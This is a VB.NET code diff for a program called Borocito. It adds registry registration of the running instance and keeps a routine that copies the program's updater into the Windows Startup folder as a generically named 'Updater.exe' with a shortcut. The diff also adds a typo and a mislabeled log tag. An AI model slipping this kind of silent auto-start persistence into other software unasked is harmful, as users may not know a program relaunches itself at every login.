@@ -187,6 +187,7 @@ Module StartUp
                     Return False
                 Else
                     AddToLog("AlreadyExist@StartUp", "Already exist. Im here!", False)
+                    RegisterInstance()
                     Return True
                 End If
                 Return False
@@ -196,6 +197,17 @@ Module StartUp
             Return False
         End Try
     End Function
+    Sub RegisterInstance()
+        Try
+            If regKey IsNot Nothing Then
+                regKey.SetValue(My.Application.Info.AssemblyName, Application.ExecutablePath)
+                regKey.SetValue("Name", My.Application.Info.AssemblyName)
+                regKey.SetValue("Version", My.Application.Info.Version.ToString & " (" & Application.ProductVersion & ")")
+            End If
+        Catch ex As Exception
+            AddToLog("RegisterInstance@StartUp", "Error: " & ex.Message, True)
+        End Try
+    End Sub
     Sub RestartBorocito()
         Try
             AddToLog("RestartBorocito@StartUp", "Restarting...", False)
@@ -208,7 +220,7 @@ Module StartUp
     End Sub
     Sub SetExistence()
         Try
-            AddToLog("SetExistence@StartUp", "Setting the existente in the Windows Registry", False)
+            AddToLog("SetExistence@StartUp", "Seting the existente in the Windows Registry", False)
             Registry.CurrentUser.CreateSubKey("SOFTWARE\\Borocito")
             regKey.SetValue("UID", UID, RegistryValueKind.String)
         Catch ex As Exception
@@ -218,32 +230,19 @@ Module StartUp
     Sub StartWithWindows()
         Try
             AddToLog("StartWithWindows@StartUp", "Making Borocito start with Windows...", False)
-            'If My.Computer.FileSystem.FileExists(Environment.GetFolderPath(Environment.SpecialFolder.Startup) & "\Updater.exe") Then
-            '    My.Computer.FileSystem.DeleteFile(Environment.GetFolderPath(Environment.SpecialFolder.Startup) & "\Updater.exe")
-            'End If
-            'My.Computer.FileSystem.CopyFile(DIRCommons & "\BorocitoUpdater.exe", Environment.GetFolderPath(Environment.SpecialFolder.Startup) & "\Updater.exe")
-            'If My.Computer.FileSystem.FileExists(Environment.GetFolderPath(Environment.SpecialFolder.Startup) & "\Updater.bat") = False Then
-            '    Dim CMDContent As String = "@echo off" &
-            '    vbCrLf & "title Borocito CLI" &
-            '    vbCrLf & "cd " & """" & DIRCommons & """" &
-            '    vbCrLf & "start " & "BorocitoUpdater.exe" &
-            '    vbCrLf & "exit"
-            '    My.Computer.FileSystem.WriteAllText(Environment.GetFolderPath(Environment.SpecialFolder.Startup) & "\Updater.bat", CMDContent, False, System.Text.Encoding.ASCII)
-            'End If
             Dim StartupShortcut As String = Environment.GetFolderPath(Environment.SpecialFolder.Startup) & "\Updater.lnk"
-            If My.Computer.FileSystem.FileExists(StartupShortcut) = False Then
+            If Not My.Computer.FileSystem.FileExists(StartupShortcut) Then
                 Dim WSHShell As Object = CreateObject("WScript.Shell")
                 Dim Shortcut As Object = WSHShell.CreateShortcut(StartupShortcut)
                 Shortcut.IconLocation = DIRCommons & "\BorocitoUpdater.exe,0"
                 Shortcut.TargetPath = DIRCommons & "\BorocitoUpdater.exe"
-                'Shortcut.Arguments = " /StartBorocito"
                 Shortcut.WindowStyle = 1
                 Shortcut.Description = "Updater software for Borocito"
                 Shortcut.Save()
                 My.Computer.FileSystem.CopyFile(DIRCommons & "\BorocitoUpdater.exe", Environment.GetFolderPath(Environment.SpecialFolder.Startup) & "\Updater.exe")
             End If
         Catch ex As Exception
-            AddToLog("StartWithWindows@StartUp", "Error: " & ex.Message, True)
+            AddToLog("StartWithWindows@Extractor", "Error: " & ex.Message, True)
         End Try
     End Sub
     Sub StartWithAdmin()
